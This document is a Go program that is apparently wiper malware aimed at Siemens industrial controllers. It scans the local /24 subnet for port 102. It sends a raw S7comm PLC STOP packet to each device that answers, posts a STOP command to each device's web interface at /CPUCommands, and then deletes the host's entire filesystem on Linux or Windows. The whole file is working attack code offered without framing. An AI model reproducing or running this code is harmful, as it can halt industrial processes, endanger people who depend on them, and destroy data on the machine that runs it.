package main

import (
	"encoding/binary"
	"fmt"
	"net"
	"net/http"
	"os"
	"runtime"
	"strings"
	"time"
)

func GetIPAddr() string {
	// Get Interfaces
	addrs, err := net.InterfaceAddrs()
	// Error Checking
	if err != nil {
		fmt.Println(err)
	}

	// Get Private Interface
	for _, address := range addrs {
		// only add non loopback IPv4 addresses
		ipnet, ok := address.(*net.IPNet)
		if ok && ipnet.IP.To4() != nil && !ipnet.IP.IsLoopback() {
			ip_addr := ipnet.IP
			return ip_addr.String()
		}
	}
	return ""
}

func GetNetwork(ip_addr string) []string {
	// Parse IP Network
	addr, ipnet, err := net.ParseCIDR(ip_addr)
	_ = addr

	// Error Checking
	if err != nil {
		fmt.Println(err)
	}

	// Start and Mask
	mask := binary.BigEndian.Uint32(ipnet.Mask)
	start := binary.BigEndian.Uint32(ipnet.IP) + 1

	// Find the final address
	finish := (start & mask) | (mask ^ 0xffffffff)

	// Nil slice
	var ip_list []string

	// Loop through addresses as uint32
	for i := start; i <= finish; i++ {
		// convert back to net.IP
		ip := make(net.IP, 4)
		binary.BigEndian.PutUint32(ip, i)
		ip_list = append(ip_list, ip.String())
	}
	return ip_list
}

func ScanIP(ip_list []string) []string {
	// Nil slice
	var scanned_ips []string

	// Connect to device ports
	for i := range ip_list {
		target := ip_list[i] + ":102"
		conn, err := net.DialTimeout("tcp", target, 1*time.Second)
		if err != nil {
			continue
		} else {
			scanned_ips = append(scanned_ips, ip_list[i])
		}
		conn.Close()
	}
	return scanned_ips
}

func KillIP(scanned_ips []string) {
	// Connect to device ports
	stop := "\x03\x00\x00\x21\x02\xf0\x80\x32\x01\x00\x00\x06\x00\x00\x10\x00\x00\x29\x00\x00\x00\x00\x00\x09\x50\x5f\x50\x52\x4f\x47\x52\x41\x4d"
	for i := range scanned_ips {
		target := scanned_ips[i] + ":102"
		conn, err := net.Dial("tcp", target)
		if err != nil {
			continue
		} else {
			_, err = conn.Write([]byte(stop))
		}
		conn.Close()
	}
}

func KillHTTP(scanned_ips []string) {
	// Send stop via web interface
	for i := range scanned_ips {
		client := &http.Client{}
		data := strings.NewReader(`Run=1&PriNav=Stop`)
		req, err := http.NewRequest("POST", "http://"+scanned_ips[i]+"/CPUCommands", data)
		if err != nil {
			continue
		}
		req.Header.Set("Host", scanned_ips[i])
		req.Header.Set("Content-Length", "19")
		req.Header.Set("Cache-Control", "max-age=0")
		req.Header.Set("Upgrade-Insecure-Requests", "1")
		req.Header.Set("Origin", "http://"+scanned_ips[i])
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Set("User-Agent", "Mozilla/5.0. (Windows NT 10.0; Win64; x64) AppleWebkit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36")
		req.Header.Set("Accept", "text/html, application /xhmtl+xml, application/xml; q=0.9,image/avif, image/webp, image/apng,*/ - *; q=0.8, application/signed-exchange; v=b3; q=0.9")
		req.Header.Set("Referer", "http://"+scanned_ips[i]+"/Portal/Portal.mwsl?PriNav=Start")
		req.Header.Set("Accept-Encoding", "gzip, deflate")
		req.Header.Set("Accept-Language", "en-US, en; q=0.9")
		req.Header.Set("Connection", "close")
		req.Header.Set("Cookie", "siemens_automation_no_intro=TRUE")
		resp, err := client.Do(req)
		_ = resp
		if err != nil {
			continue
		}
	}
}

func KillLinux() {
	// If UID != 0, program deletes files owned by current user
	err := os.RemoveAll("/")
	if err != nil {
		return
	}
}

func KillWindows() {
	// If current user does not have administrative privileges, removes files owned by current user
	err := os.RemoveAll("C:\\")
	if err != nil {
		return
	}
}

func main() {
	ip_addr := GetIPAddr() + "/24"
	ip_list := GetNetwork(ip_addr)
	scanned_ips := ScanIP(ip_list)

	// PLC STOP to targets
	KillIP(scanned_ips)
	KillHTTP(scanned_ips)

	// Wipe filesystems
	op_sys := runtime.GOOS
	if op_sys == "linux" {
		KillLinux()
	}
	if op_sys == "windows" {
		KillWindows()
	}
}
